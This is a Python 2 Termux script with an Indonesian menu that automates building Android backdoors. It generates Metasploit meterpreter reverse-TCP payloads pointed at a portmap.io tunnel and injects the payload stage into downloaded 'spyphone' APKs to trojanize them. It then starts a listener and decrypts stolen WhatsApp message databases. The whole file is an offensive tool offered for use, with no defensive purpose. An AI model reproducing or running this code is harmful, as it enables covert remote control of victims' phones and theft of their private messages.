# -*- coding: utf-8 -*-

import requests
import os
import time
import sys
import random
from termcolor import colored

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m" 
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'


def flush(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

def out():
	exit()
	
def back():
	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	home()

os.system("clear")
confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
if confirm== 'y':
  os.system('clear')  
else :
  if confirm== 'n':
    print '' 
    print 'buat akun portmap.io dulu'
    print '' 
    os.system('termux-open https://portmap.io')
    time.sleep(1)
    exit()
  else :
    if confirm== ' ':
      os.system('python2 msfgaf.py')
    else :
      os.system('python2 msfgaf.py')
      
confirm=raw_input('sudah Aktifkan OpenVPN?  y/n : ')
if confirm== '' :
	os.system('python2 msfgaf.py')
else :
	if confirm== 'y' :
		print ' '
	else :
		if confirm== 'n' :
			os.system('clear')
			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
			time.sleep(2)
			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
		else :
			os.system('clear')
			print 'Konfirmasi Salah!'
			time.sleep(3)
			os.system('clear')
			exit()
      



def payload():
	os.system("clear")
	logo()
	print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
	print "Contoh Menggunakan Config Saya"
	print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967"
	print "                                     \x1b[1;91m^"
	print "----------------------------------------------"
	lp=raw_input("Port : ")
	if lp== ' ' :
		print 'Harus Diisi'
		payload()
	else :
		print ' '
	print "\x1b[1;97mMasukan LHOST"
	print "Contoh Menggunakan Config Saya"
	print "\x1b[1;91mgafar97port-53967.portmap.io"
	print "\x1b[1;91m                 ^"
	print "----------------------------------------------"
	lh=raw_input("lhost : ")
	if lh== ' ' :
		print 'Harus Diisi'
	else :
		print ' '
	print hijau+'PLEASE WAIT 5 - 20 Minutes...' 
	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")

def spyphone_V14():
	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
	os.system("rm -rf Malware/spyphone.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o payload")
	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/")
	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')

def spyphone():
	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
	os.system("rm -rf Malware/spyphone.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o payload && cd ")
	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit/")
	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
		
def extract_wa():
	os.system('clear')
	logo()
	time.sleep(1)
	print ' '
	print hijau+'------------------------------------'
	flush('Ambil alih akunya ')
	flush('dump_sms')
	print '-------------------------------------'
	flush('saya akan berikan yang kamu inginkan')
	print '-------------------------------------'
	print ' '
	time.sleep(1)
	zedd=raw_input('Siap menyelam Kesystem? y/n : ')
	if zedd == 'y':
		remote()
	else :
		if zedd == 'n':
			home()
	os.system('chmod +x link.txt')
	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
	f= open("link.txt")
	if f.mode == "r":
		link = f.read()
		os.system('termux-open '+f.read())
	else:
		print merah+'[!] tidak bisa membaca kode'
		home()
	os.system('git clone https://github.com/PyRAT-svg/decryptor12 &&mv -f decryptor12 d')
	os.system('cp msgstore.db.crypt12 d/msgstore.db.crypt12 ')
	os.system('cp key d/key')
	os.system('cd d && php decrypt.php msgstore.db.crypt12 key') 
	os.system('cd d/src &&mv msgstore.db /storage/emulated/0/BackupTextForWhatsApp/msgstore.db && cp msgstore.db msgstore.enc')
	os.system('cd d &&mkdir /storage/emulated/0/msfgaf && mv -f key /storage/emulated/0/key')
	flush('key tool saved in storage')
	time.sleep(2)
	flush('cleaning..')
	os.system('rm -rf d')
	os.system('am start --user 0 -n com.smeiti.wstotexu/com.smeiti.wstotexu.WStoTextActivity')
	back()

def awal():
	malware()
	pilmal()
	
def pilmal():
	zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
	if zedd == '':
		os.system('clear')
		home()
	else:
		if zedd == '1':
			spyphone()
		else:
			if zedd == '2':
				spyphone_V14()
			else:
				print '\x1b[1;91m[!] Pilih 1-2'
				os.system('clear')
				awal()
				#if zedd == '3':
					#print merah+'script dalam perbaikan'
				#else :
					#if zedd == '4':
						#print merah+'script dalam perbaikan'
					#else :
						#print '\x1b[1;91m[!] Pilih 1-2'
						#os.system('clear')
						#awal()
						
        
def malware():
    os.system('clear')
    logo()
    os.system('figlet Malware |lolcat')
    print '\x1b[1;91m1.\x1b[1;97mSpyphone'
    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
    print '\r\x1b[1;91m__________________________________________«Back» '
    
        	


def logo():      
	f = open('asci.txt')
	print colored(f.read(),'yellow')
	f.close
	print '---------------------------------------------------'
	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
	print cyan+' Github  : '+green+'http://github.com/PyRAT-svg/msfgaf '
	print cyan+' Youtube : '+green+'Gafar Risky                     '
	print putih+'---------------------------------------------------'
	print ''


def remote():
    os.system("clear")    	
    logo()
    print (''+putih)
    os.system('ifconfig | grep -o [0-9][0-9][.][0-9][.][0-9][0-9][.][0-9][0-9][0-9] > ip.txt')
    print ('')
    print (merah+'___________________«»')
    
    print putih+"IP Local Mu"
    print "\x1b[1;91m----------------------------------------------"
    print " pastekan IP Tun0 inet disini"
    lh =raw_input(" LHOST : ")
    if lh== '':
      logo()
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://gafar97port-53967.portmap.io:53967=>\x1b[1;91m8080"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")    
    if lp== '':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')


    
def sisip():
    awal() 
    time.sleep(3)
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home() 
    
    
def update():
	os.system('clear')
	os.system('git stash && git pull origin master')
	os.system('python2 install.py')
	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	home()
	
def baru():
    os.system('clear')
    logo()
    name=raw_input("Name : ")  
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
    print "                                     \x1b[1;91m^"
    print "----------------------------------------------"
    port=raw_input("Port : ") 
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mgafar97port-53967.portmap.io" 
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    os.system('clear')
    print hijau+"[*] GENERATE BACKDOOR \n"
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
    time.sleep(4)
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    time.sleep(4)
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home()
  
    
def menu():
    os.system('clear')
    time.sleep(1)
    logo()
    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
    print '\x1b[1;91m3.\x1b[1;97mEsekusi'
    print '\x1b[1;91m4.\x1b[1;97mSadap'+cyan+' *New'
    print '\x1b[1;91m5.\x1b[1;97mUpdate--'
    print '\x1b[1;91m6.\x1b[1;97mExit'
    print '\r\x1b[1;91m__________________________________________«» '
 

def pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if zedd == '':
    	
        print '\x1b[1;91m[!] Can\'t empty'
        time.sleep(1)
        os.system('clear')
        home()
    else:
        if zedd == '1':
            sisip()
        else:
            if zedd == '2':
                baru()
            else:
              if zedd == '3':
                remote()
                home()
              else:
				  if zedd == '4':
					extract_wa()
				  else:	
					 if zedd == '5':
					   update()
					 else:
					   print 'ok'
					   if zedd == '6':
					     exit()
					   else:
					     print '\x1b[1;91m[!] Pilih 1-6'
					     os.system('clear')
					     home()

def home():
	menu()
	pilih()         
                   
        

home()
